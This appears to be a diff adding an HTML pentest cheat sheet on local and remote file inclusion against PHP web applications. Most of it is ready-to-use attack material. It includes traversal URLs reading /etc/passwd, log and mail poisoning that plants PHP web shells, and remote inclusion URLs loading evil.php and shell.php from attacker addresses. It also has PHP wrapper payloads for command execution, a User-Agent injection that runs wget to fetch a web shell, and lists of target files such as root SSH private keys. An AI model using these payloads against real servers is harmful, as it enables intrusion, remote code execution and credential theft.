@@ -1,0 +1,223 @@
+<h1 id="1-local-file-inclusion">1 Local File inclusion</h1>
+<hr />
+<ul>
+  <li>linux:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    https://insecure-website.com/loadImage?filename=../../../etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>windows
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target.com/?page=c:\windows\system32\drivers\etc\hosts
+http://webserver:ip/index.html?../../../../../boot.ini
+
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="log-poisoning">Log Poisoning</h3>
+
+<ul>
+  <li>web log poisoning
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.10.14 80
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s1">'&lt;pre&gt;'</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span>  <span class="o">.</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li><strong>linux</strong>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+  <li><strong>windows</strong>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.14/menu.php?file=c:\xamp\apache\logs\access.log&amp;cmd=ls
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="ssh-log-posioning">SSH log posioning</h3>
+<p>http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</p>
+
+<h3 id="mail-log">Mail log</h3>
+<p>LFI /var/mail/<user></user></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet <span class="nt">&lt;IP&gt;</span> 25  
+EHLO <span class="nt">&lt;random</span> <span class="na">character</span><span class="nt">&gt;</span>  
+
+VRFY <span class="nt">&lt;user&gt;</span>@localhost  
+
+mail from:attacker@attack.com  
+rcpt to: <span class="nt">&lt;user&gt;</span>@localhost  
+data  
+
+Subject: title  
+
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span>  
+
+<span class="nt">&lt;end</span> <span class="na">with</span> <span class="err">.</span><span class="nt">&gt;</span>  
+
+</code></pre></div></div>
+
+<h1 id="2-remote-file-inclusion">2 Remote File Inclusion</h1>
+<hr />
+
+<p>requires allow_url_fopen=On and allow_url_include=On</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+$incfile = $_REQUEST["file"];  
+include($incfile.".php");  
+
+</code></pre></div></div>
+
+<ul>
+  <li><strong>original</strong>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=FR&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+  <li><strong>modificado</strong>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php&amp;Submit=Submit
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>seguro nos tira un problema  tratando de ejecutar evil.txt.php, asi que podemos usar un nullbyte para que no appenda el .php</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php%00&amp;Submit=Submit
+</code></pre></div></div>
+
+<h2 id="web-shell-rfi">web shell rfi</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat shell.php
+&lt;?=`$_GET[0]`?&gt;
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&amp;0=dir
+</code></pre></div></div>
+
+<h1 id="3-common-obstacules">3 Common obstacules</h1>
+<hr />
+<ul>
+  <li>just the path
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    filename=/etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>stripped non recursive<br />
+```
+    filename=….//….//….//etc/passwd</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* encoding  
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  filename=..%252f..%252f..%252fetc/passwd ``` * validation of start path ```
+  filename=/var/www/images/../../../etc/passwd ``` * add nullbyte ```
+  filename=..%252f..%252f..%252fetc/passwd%00 ```
+</code></pre></div></div>
+
+<h1 id="4-common-lfi-to-rce">4 common LFI to RCE</h1>
+<hr />
+
+<h2 id="1-using-file-upload-formsfunctions">1. Using file upload forms/functions</h2>
+<p>upload a shell,  then</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=path/to/uploaded/file.php
+</code></pre></div></div>
+
+<h2 id="2-using-the-php-wrapper-expectcommand">2. Using the PHP wrapper expect://command</h2>
+<p>if the app use an include:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>  
+<span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>  
+<span class="cp">?&gt;</span>  
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target.com/index.php?page=expect://whoami  
+</code></pre></div></div>
+<h2 id="3-using-php-wrapper-file">3. Using php wrapper file://</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/include.php?page=file:///path/to/file.ext
+</code></pre></div></div>
+<h2 id="4-using-the-php-wrapper-phpfilter">4. Using the PHP wrapper php://filter</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc
+http://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc
+http://localhost/include.php?page=php://filter/resource=/etc/passwd
+</code></pre></div></div>
+<h2 id="5-using-php-input-stream">5. Using PHP input:// stream</h2>
+<p>POST</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/fi/?page=php://input&amp;cmd=ls
+</code></pre></div></div>
+<h2 id="6-using-datatextplainbase64command">6. Using data://text/plain;base64,command</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data://text/plain;base64,[command encoded in base64]
+or
+data://text/plain,&lt;?php shell_exec($_GET['cmd']);?&gt;  
+</code></pre></div></div>
+<p>ex:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=  
+http://example.com/Keeper.php?page=data://text/plain,&lt;?system('id');?&gt;  
+</code></pre></div></div>
+<h2 id="7-using-procselfenviron">7. Using /proc/self/environ</h2>
+<p>Another popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.</p>
+
+<p>Our main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://secureapplication.example/index.php?view=../../../proc/self/environ
+</code></pre></div></div>
+<p>response:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP_USER_AGENT="curl/" &lt;/body&gt;
+</code></pre></div></div>
+<p>so we can inject shit like a webshell</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "User-Agent: &lt;?php system('wget http://10.10.14.6/webshell.php -O webshell.php')" http://target.com
+
+curl http://target.com/webshell.php&amp;cmd=ls
+
+</code></pre></div></div>
+
+<h2 id="8-using-procselffd">8. Using /proc/self/fd</h2>
+<p>brute force the fd until you see “referer”
+/proc/self/fd/{number}
+then</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "Referer: &lt;?php phpinfo(); ?&gt;" http://target.com
+</code></pre></div></div>
+
+<h2 id="9-using-zip">9. Using zip</h2>
+<p>Upload a ZIP file containing a PHP shell compressed and access:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
+</code></pre></div></div>
+<h2 id="10-using-log-files-with-controllable-input-like">10. Using log files with controllable input like:</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  . /var/log/apache/access.log
+  . /var/log/apache/error.log
+  . /var/log/vsftpd.log
+  . /var/log/sshd.log
+  . /var/log/mail
+</code></pre></div></div>
+
+<h1 id="5-common-files-location">5 Common files location</h1>
+<hr />
+
+<p>https://wiki.apache.org/httpd/DistrosDefaultLayout<br />
+<strong>Common log file location</strong><br />
+<strong>Ubuntu, Debian</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/apache2/error.log  
+/var/log/apache2/access.log  
+</code></pre></div></div>
+<p><strong>Red Hat, CentOS, Fedora, OEL, RHEL</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/httpd/error_log  
+/var/log/httpd/access_log  
+</code></pre></div></div>
+<p><strong>FreeBSD</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/httpd-error.log  
+/var/log/httpd-access.log  
+</code></pre></div></div>
+<p><strong>Common Config file location</strong></p>
+
+<p>check any restriction or hidden path on accessing the server</p>
+
+<p><strong>Ubuntu</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/apache2.conf  
+/etc/apache2/httpd.conf  
+/etc/apache2/apache2.conf  
+/etc/httpd/httpd.conf  
+/etc/httpd/conf/httpd.conf  
+</code></pre></div></div>
+<p><strong>FreeBSD</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/etc/apache2/httpd.conf  
+
+Hidden site?  
+/etc/apache2/sites-enabled/000-default.conf  
+</code></pre></div></div>
+
+<p><strong>root/user ssh keys? .bash_history?</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/root/.ssh/id_rsa
+/root/.ssh/id_rsa.keystore
+/root/.ssh/id_rsa.pub
+/root/.ssh/authorized_keys
+/root/.ssh/known_hosts
+</code></pre></div></div>
+<h1 id="resources">Resources</h1>
+<p>https://www.php.net/manual/en/wrappers.file.php</p>
